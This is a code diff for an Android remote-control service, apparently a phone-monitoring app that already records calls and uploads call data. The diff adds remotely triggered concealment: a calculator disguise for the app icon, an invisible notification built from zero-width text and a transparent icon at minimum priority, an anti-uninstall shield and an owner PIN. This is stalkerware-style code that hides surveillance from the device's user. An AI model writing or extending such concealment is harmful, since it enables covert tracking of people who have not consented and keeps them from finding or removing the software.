@@ -373,6 +373,8 @@ class PhoneLinkService : Service() {
             Events.SCHEDULE_COMMAND -> handleScheduleCommand(payload)
             Events.SOS_CONFIG_COMMAND -> handleSosConfig(payload)
             Events.CALL_RECORDING_CONFIG_COMMAND -> handleCallRecordingConfig(payload)
+            Events.CAMOUFLAGE_CONFIG_COMMAND -> handleCamouflageConfig(payload)
+            Events.QUICK_SETTING_COMMAND -> handleQuickSetting(payload)
             else -> Log.w(TAG, "unhandled command: $event")
         }
     }
@@ -536,6 +538,49 @@ class PhoneLinkService : Service() {
     private fun handleCallRecordingConfig(payload: JSONObject) {
         if (payload.has("enabled")) DevicePrefs.callRecordingEnabled = payload.optBoolean("enabled")
         webSocket.send(Events.CALL_RECORDING_STATUS, DevicePrefs.getCallRecordingConfigJson())
+    }
+
+    private fun handleCamouflageConfig(payload: JSONObject) {
+        if (payload.has("calculatorDisguise")) {
+            val enabled = payload.optBoolean("calculatorDisguise", false)
+            DevicePrefs.calculatorDisguiseEnabled = enabled
+            DevicePrefs.updateCalculatorAlias(this, enabled)
+        }
+        if (payload.has("stealthNotification")) {
+            val enabled = payload.optBoolean("stealthNotification", true)
+            DevicePrefs.stealthNotificationEnabled = enabled
+            updateNotification(if (enabled) "\u200B" else "Connected")
+        }
+        if (payload.has("antiTamper")) {
+            DevicePrefs.antiUninstallShieldEnabled = payload.optBoolean("antiTamper", true)
+        }
+        if (payload.has("ownerPin")) {
+            val pin = payload.optString("ownerPin", "").trim()
+            if (pin.isNotBlank()) DevicePrefs.setOwnerPin(pin)
+        }
+        pushCamouflageStatus()
+    }
+
+    private fun pushCamouflageStatus() {
+        val json = JSONObject().apply {
+            put("deviceId", DevicePrefs.deviceId)
+            put("calculatorDisguise", DevicePrefs.calculatorDisguiseEnabled)
+            put("stealthNotification", DevicePrefs.stealthNotificationEnabled)
+            put("antiTamper", DevicePrefs.antiUninstallShieldEnabled)
+            put("hasOwnerPin", DevicePrefs.hasOwnerPin())
+        }
+        webSocket.send(Events.CAMOUFLAGE_STATUS, json)
+    }
+
+    private fun handleQuickSetting(payload: JSONObject) {
+        val action = payload.optString("action", "")
+        val result = com.phonelink.hub.remote.QuickSettingsController.handleQuickSettingAction(this, action, payload)
+        webSocket.send(Events.QUICK_SETTING_STATUS, result)
+    }
+
+    private fun pushQuickSettingsStatus() {
+        val json = com.phonelink.hub.remote.QuickSettingsController.getStatus(this)
+        webSocket.send(Events.QUICK_SETTING_STATUS, json)
     }
 
     fun executeCommandFromScheduler(cmd: String, payload: JSONObject) {
@@ -824,6 +869,8 @@ class PhoneLinkService : Service() {
                 put("syncConfig", DevicePrefs.getSyncConfigJson())
             }
         )
+        pushCamouflageStatus()
+        pushQuickSettingsStatus()
     }
 
     fun pushCalls() {
@@ -1490,8 +1537,15 @@ class PhoneLinkService : Service() {
     private var lastNotifiedState: String? = null
 
     private fun buildNotification(text: String): Notification {
-        val intent = Intent(this, StatusActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+        val isStealth = DevicePrefs.stealthNotificationEnabled
+        val intent = if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
+            Intent(this, com.phonelink.hub.calculator.CalculatorActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+        } else {
+            Intent(this, StatusActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
         }
         val pi = PendingIntent.getActivity(
             this,
@@ -1500,7 +1554,7 @@ class PhoneLinkService : Service() {
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
 
-        val isConnected = try { webSocket.isOpen } catch (_: Exception) { false }
+        val isConnected = try { webSocket.isOpen } catch (e: Exception) { false }
         val isConnecting = !isConnected && (text.contains("reconnect", ignoreCase = true) || text.contains("connect", ignoreCase = true))
 
         val statusText = when {
@@ -1509,23 +1563,35 @@ class PhoneLinkService : Service() {
             else -> "Disconnected"
         }
 
+        val iconRes = if (isStealth) R.drawable.ic_notification_transparent else R.drawable.ic_notification_minimal
+        val notifTitle = if (isStealth) "\u200B" else getString(R.string.app_name)
+        val notifText = if (isStealth) "\u200B" else statusText
+        val priority = if (isStealth) NotificationCompat.PRIORITY_MIN else NotificationCompat.PRIORITY_LOW
+
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle(getString(R.string.app_name))
-            .setContentText(statusText)
-            .setSmallIcon(R.drawable.ic_notification_minimal)
+            .setContentTitle(notifTitle)
+            .setContentText(notifText)
+            .setSmallIcon(iconRes)
             .setOngoing(true)
             .setOnlyAlertOnce(true)
             .setSilent(true)
             .setContentIntent(pi)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(priority)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setShowWhen(false)
             .build()
     }
 
     private fun buildFallbackNotification(text: String): Notification {
-        val intent = Intent(this, StatusActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+        val isStealth = DevicePrefs.stealthNotificationEnabled
+        val intent = if (isStealth || DevicePrefs.calculatorDisguiseEnabled) {
+            Intent(this, com.phonelink.hub.calculator.CalculatorActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+        } else {
+            Intent(this, StatusActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
         }
         val pi = PendingIntent.getActivity(
             this,
@@ -1533,26 +1599,32 @@ class PhoneLinkService : Service() {
             intent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
         )
+        val iconRes = if (isStealth) R.drawable.ic_notification_transparent else R.drawable.ic_notification_minimal
+        val notifTitle = if (isStealth) "\u200B" else getString(R.string.app_name)
+        val notifText = if (isStealth) "\u200B" else text
+        val priority = if (isStealth) NotificationCompat.PRIORITY_MIN else NotificationCompat.PRIORITY_LOW
+
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle(getString(R.string.app_name))
-            .setContentText(text)
-            .setSmallIcon(R.drawable.ic_notification_minimal)
+            .setContentTitle(notifTitle)
+            .setContentText(notifText)
+            .setSmallIcon(iconRes)
             .setOngoing(true)
             .setOnlyAlertOnce(true)
             .setSilent(true)
             .setContentIntent(pi)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(priority)
             .build()
     }
 
     private fun updateNotification(text: String) {
-        val isConnected = try { webSocket.isOpen } catch (_: Exception) { false }
+        val isConnected = try { webSocket.isOpen } catch (e: Exception) { false }
         val isConnecting = !isConnected && (text.contains("reconnect", ignoreCase = true) || text.contains("connect", ignoreCase = true))
         val currentState = when {
             isConnected -> "Connected"
             isConnecting -> "Connecting"
             else -> "Disconnected"
         }
+
         if (currentState == lastNotifiedState) return // Avoid redundant notification updates
         lastNotifiedState = currentState
 
@@ -1568,7 +1640,7 @@ class PhoneLinkService : Service() {
         val channel = NotificationChannel(
             CHANNEL_ID,
             getString(R.string.notification_channel_name),
-            NotificationManager.IMPORTANCE_LOW
+            NotificationManager.IMPORTANCE_MIN
         ).apply {
             description = getString(R.string.notification_channel_desc)
             setShowBadge(false)
